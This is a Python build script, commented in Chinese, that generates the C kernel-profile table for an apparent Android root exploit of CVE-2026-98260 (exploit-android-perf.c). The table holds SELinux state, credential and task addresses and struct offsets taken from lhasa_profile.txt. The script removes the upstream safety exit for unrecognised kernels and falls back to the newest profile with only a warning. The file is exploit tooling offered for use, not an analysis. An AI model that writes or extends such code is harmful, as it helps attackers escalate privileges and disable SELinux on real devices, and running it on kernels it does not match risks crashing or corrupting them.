#!/usr/bin/env python3
"""从 lhasa_profile.txt 生成上游 CVE-2026-98260 源码所需的 profile 表。

上游 src/xr98260_profiles.c 是编译期常量表（只含作者手上两条内核），且遇到
未知 uname 会 exit(2)。本项目把它换成由唯一常量文件生成，并且**不设硬门槛**：
匹配不到就退回表中最新的那条 profile，只打警告。

用法：
  tools/gen_xr_profiles.py <lhasa_profile.txt> <输出 .c>

输出实现上游头文件声明的三个符号：
  const struct xr_kernel_profile *xr_profile(void);
  const struct xr_kernel_profile *xr_profile_by_id(const char *id);
  const char *xr_profile_id(void);
"""

from __future__ import annotations

import pathlib
import re
import sys

# 结构体偏移：上游注释称两份内核一致，这里沿用其值。
OFFSETS = {
    "kitimer_bytes": 0x180,
    "kitimer_node": 0xE0,
    "task_cred": 0x908,
    "task_bytes": 0x1280,
    "cred_bytes": 184,
    "saved_sigmask": 0x980,
}

# 上游结构体里有、但本仓库构建的 exploit-android-perf.c 未使用的字段，统一置 0。
UNUSED = [
    "getpid", "kptr_restrict", "misc_list", "uhid_misc", "uhid_fops",
    "configfs_read_iter", "configfs_bin_write_iter", "init_task",
    "sysctl_tcp_mem", "tcp_mem_ctl",
]

REQUIRED = ["timer", "cred", "selinux", "userns", "rootuser", "groups", "ucounts",
            "task_site", "task_bytes"]


def parse(path: pathlib.Path) -> list:
    entries = []
    for raw in path.read_text(encoding="utf-8").splitlines():
        line = raw.strip()
        if not line.startswith("release="):
            continue
        fields = {}
        release = None
        for token in line.split():
            if token.startswith("release="):
                release = token[len("release="):]
            elif "=" in token:
                key, _, value = token.partition("=")
                fields[key] = value
        if not release:
            continue
        missing = [k for k in REQUIRED if k not in fields]
        if missing:
            print(f"跳过 {release}：缺字段 {missing}", file=sys.stderr)
            continue
        match = re.sub(r"^.*-5-", "", release)
        entries.append({"release": release, "match": match, "fields": fields})
    return entries


def emit(entries: list) -> str:
    out = []
    out.append("/* 由 tools/gen_xr_profiles.py 从 lhasa_profile.txt 生成，勿手改。 */")
    out.append('#include "xr98260_profiles.h"')
    out.append("")
    out.append("#include <stdio.h>")
    out.append("#include <stdlib.h>")
    out.append("#include <string.h>")
    out.append("#include <sys/utsname.h>")
    out.append("")
    out.append("#define U(x) UINT64_C(x)")
    out.append("")
    out.append("static const struct xr_kernel_profile xr_profiles[] = {")
    for index, entry in enumerate(entries):
        fields = entry["fields"]
        out.append("\t{")
        out.append(f'\t\t.id = "l{index}",')
        out.append(f'\t\t.match = "{entry["match"]}",')
        out.append(f'\t\t.display = "{entry["release"]}",')
        out.append(f'\t\t.selinux_state = U({fields["selinux"]}),')
        out.append(f'\t\t.alloc_timer_site = U({fields["timer"]}),')
        out.append(f'\t\t.task_alloc_site = U({fields["task_site"]}),')
        out.append(f'\t\t.cred_alloc_site = U({fields["cred"]}),')
        out.append(f'\t\t.init_user_ns = U({fields["userns"]}),')
        out.append(f'\t\t.root_user = U({fields["rootuser"]}),')
        out.append(f'\t\t.init_groups = U({fields["groups"]}),')
        out.append(f'\t\t.init_ucounts = U({fields["ucounts"]}),')
        for name in UNUSED:
            out.append(f"\t\t.{name} = U(0),")
        out.append(f'\t\t.kitimer_bytes = 0x{OFFSETS["kitimer_bytes"]:x},')
        out.append(f'\t\t.kitimer_node = 0x{OFFSETS["kitimer_node"]:x},')
        out.append(f'\t\t.task_cred = 0x{OFFSETS["task_cred"]:x},')
        out.append(f'\t\t.task_bytes = 0x{OFFSETS["task_bytes"]:x},')
        out.append(f'\t\t.task_alloc = U({fields["task_bytes"]}),')
        out.append(f'\t\t.cred_bytes = {OFFSETS["cred_bytes"]},')
        out.append(f'\t\t.saved_sigmask = 0x{OFFSETS["saved_sigmask"]:x},')
        out.append("\t},")
    out.append("};")
    out.append("")
    out.append("#define XR_NPROFILES (sizeof(xr_profiles) / sizeof(xr_profiles[0]))")
    out.append("")
    out.append("static const struct xr_kernel_profile *g_xr_profile;")
    out.append("")
    out.append("static void xr_list_supported(void)")
    out.append("{")
    out.append('\tfprintf(stderr, "[kernel] known profiles:\\n");')
    out.append("\tfor (size_t i = 0; i < XR_NPROFILES; i++)")
    out.append('\t\tfprintf(stderr, "  %-3s %s\\n", xr_profiles[i].id, xr_profiles[i].display);')
    out.append('\tfprintf(stderr, "[kernel] override with XR98260_KERNEL=<id>\\n");')
    out.append("}")
    out.append("")
    out.append("const struct xr_kernel_profile *xr_profile_by_id(const char *id)")
    out.append("{")
    out.append("\tif (!id)")
    out.append("\t\treturn NULL;")
    out.append("\tfor (size_t i = 0; i < XR_NPROFILES; i++)")
    out.append("\t\tif (!strcmp(xr_profiles[i].id, id))")
    out.append("\t\t\treturn &xr_profiles[i];")
    out.append("\treturn NULL;")
    out.append("}")
    out.append("")
    out.append("const struct xr_kernel_profile *xr_profile(void)")
    out.append("{")
    out.append("\tconst char *env = getenv(\"XR98260_KERNEL\");")
    out.append("\tstruct utsname uts;")
    out.append("")
    out.append("\tif (g_xr_profile)")
    out.append("\t\treturn g_xr_profile;")
    out.append("\tif (env && *env) {")
    out.append("\t\tconst struct xr_kernel_profile *p = xr_profile_by_id(env);")
    out.append("\t\tif (p) {")
    out.append("\t\t\tg_xr_profile = p;")
    out.append('\t\t\tfprintf(stderr, "[kernel] profile=%s (env) %s\\n", p->id, p->display);')
    out.append("\t\t\treturn p;")
    out.append("\t\t}")
    out.append('\t\tfprintf(stderr, "[kernel] WARN 未知 XR98260_KERNEL=%s，忽略该覆盖\\n", env);')
    out.append("\t}")
    out.append("\tif (uname(&uts)) {")
    out.append("\t\tperror(\"uname\");")
    out.append("\t\texit(2);")
    out.append("\t}")
    out.append("\tfor (size_t i = 0; i < XR_NPROFILES; i++) {")
    out.append("\t\tif (strstr(uts.release, xr_profiles[i].match)) {")
    out.append("\t\t\tg_xr_profile = &xr_profiles[i];")
    out.append('\t\t\tfprintf(stderr, "[kernel] profile=%s %s\\n",')
    out.append("\t\t\t\txr_profiles[i].id, uts.release);")
    out.append("\t\t\treturn g_xr_profile;")
    out.append("\t\t}")
    out.append("\t}")
    out.append("\t/* 不设硬门槛：退回表中最后一条（最新内核），只警告。 */")
    out.append("\tg_xr_profile = &xr_profiles[XR_NPROFILES - 1];")
    out.append('\tfprintf(stderr, "[kernel] WARN 未匹配到内核 %s，退回 profile %s\\n",')
    out.append("\t\tuts.release, g_xr_profile->display);")
    out.append('\tfprintf(stderr, "[kernel] WARN 常量可能不匹配，失败时请先更新 lhasa_profile.txt\\n");')
    out.append("\txr_list_supported();")
    out.append("\treturn g_xr_profile;")
    out.append("}")
    out.append("")
    out.append("const char *xr_profile_id(void)")
    out.append("{")
    out.append("\treturn xr_profile()->id;")
    out.append("}")
    out.append("")
    return "\n".join(out)


def main() -> int:
    if len(sys.argv) < 3:
        print(__doc__)
        return 2
    source = pathlib.Path(sys.argv[1])
    target = pathlib.Path(sys.argv[2])
    entries = parse(source)
    if not entries:
        print(f"没有解析到任何 release= 行：{source}", file=sys.stderr)
        return 1
    target.write_text(emit(entries), encoding="utf-8")
    print(f"生成 {target}（{len(entries)} 个 profile）")
    for entry in entries:
        print(f"  {entry['match']}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
